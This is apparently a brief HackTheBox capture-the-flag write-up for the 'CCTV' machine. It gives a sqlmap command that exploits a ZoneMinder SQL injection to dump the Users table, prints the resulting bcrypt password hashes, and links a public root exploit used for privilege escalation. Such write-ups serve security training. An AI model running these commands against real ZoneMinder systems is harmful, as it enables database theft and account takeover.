# CCTV: HackTheBox


## Enumeration 

- Port 22,80 open

### Initial Foothold

- [This advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3) on github was the only real bug I could find for ZomeMinder, so I used this to extract the users table using the following command

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=64me2q33tsgu1n1dfgimpq291s" -D zm -T Users -C Username,Password --dump
```

- This exfiltrated this: 

```
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

- We can crack the password for the mark user which gives ssh access.

## Privilege Escalation

- Since this runs python 3.12, I used this [copy fail exploit](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) to get easy root access.
